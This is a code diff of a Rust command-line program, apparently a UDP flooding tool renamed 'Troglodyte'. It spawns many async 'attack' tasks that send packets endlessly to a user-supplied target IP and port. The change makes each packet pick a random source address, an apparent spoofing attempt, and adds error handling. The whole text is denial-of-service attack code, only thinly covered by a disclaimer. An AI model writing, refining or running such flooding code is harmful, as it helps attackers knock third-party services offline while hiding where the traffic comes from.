@@ -22,12 +22,12 @@ fn input(prompt: &str) -> String {
 
 #[tokio::main]
 async fn main() {
-    println!("Qhr 3.0 By VTJ0cGJ\nThe creator does not endorse any unintended use of this software");
+    println!("Troglodyte By VTJ0cGJ\nThe creator does not endorse any unintended use of this software");
 
     let args: Vec<String> = env::args().collect();
 
     if args.len() != 7 {
-        eprintln!("Usage: {} -t <threads> -ip <target_ip> -p <target_port>", args[0]);
+        eprintln!("{}\nUsage: -t <threads> -ip <target_ip> -p <target_port>", args[0]);
         std::process::exit(1);
     }
 
@@ -76,11 +76,9 @@ async fn main() {
 
         i += 1;
     }
-
     let threads = threads.expect("Missing threads parameter");
     let target_ip = target_ip.expect("Missing target IP parameter");
     let target_port = target_port.expect("Missing target port parameter");
-
 
     println!("Threads: {}", threads);
     println!("Target IP: {}", target_ip);
@@ -89,50 +87,42 @@ async fn main() {
     let threads_list: Arc<Mutex<Vec<JoinHandle<()>>>> = Arc::new(Mutex::new(Vec::new()));
 
     for thread_id in 1..=threads {
-        let source_ip: String = format!(
-            "{}.{}.{}.{}",
-            192,
-            168,
-            5,
-            thread_rng().gen_range(0..=255)
-        );
-
-        let handle: JoinHandle<()> = tokio::spawn(attack(
-            source_ip.clone(),
-            target_ip.clone(),
-            target_port,
-            thread_id,
-        ));
-
+        let handle: JoinHandle<()> = tokio::spawn(attack(target_ip.clone(), target_port, thread_id));
         threads_list.lock().expect("REASON").push(handle);
     }
 
     let _ = try_join_all(threads_list.lock().expect("REASON").drain(..).collect::<Vec<_>>()).await;
 }
 
-async fn attack(source_ip: String, target_ip: String, target_port: u16, thread_id: u32) {
+async fn attack(target_ip: String, target_port: u16, thread_id: u32) {
     let mut i: i32 = 1;
     loop {
+        let source_ip: String = format!(
+            "{}.{}.{}.{}",
+            rand::thread_rng().gen_range(1..=255),
+            rand::thread_rng().gen_range(1..=255),
+            rand::thread_rng().gen_range(1..=255),
+            rand::thread_rng().gen_range(1..=255),
+        );
+
         let source_port: i32 = rand::thread_rng().gen_range(1..=65535);
 
-        // Create the destination address
         let addr: String = format!("{}:{}", target_ip, target_port);
-
-        // Bind the socket to the source IP and port
         let local_addr: String = format!("{}:{}", source_ip, source_port);
         println!("Local Address: {}", local_addr);
-        let socket: UdpSocket = UdpSocket::bind(&local_addr).await.expect("Failed to bind address");
 
-        // Send data to the target address
-        let data_to_send: &[u8] = b"Hello, server!";
+        match UdpSocket::bind(&local_addr).await {
+            Ok(socket) => {
+                let data_to_send: &[u8] = b"Hello, server!";
 
-        socket.send_to(data_to_send, &addr.parse::<SocketAddrV4>().expect("Invalid target address"))
-            .await
-            .expect("Failed to send data");    
+                match socket.send_to(data_to_send, &addr.parse::<SocketAddrV4>().expect("Invalid target address")).await {
+                    Ok(_) => println!("Packet sent: {} on thread: {}", i, thread_id),
+                    Err(e) => eprintln!("Failed to send data: {}", e),
+                }
+            }
+            Err(e) => eprintln!("Failed to bind address: {}", e),
+        }
 
-        println!("Packet sent: {} on thread: {}", i, thread_id);
-
-        // Sleep for 100 milliseconds before sending the next packet
         sleep(Duration::from_millis(100)).await;
         i += 1;
     }
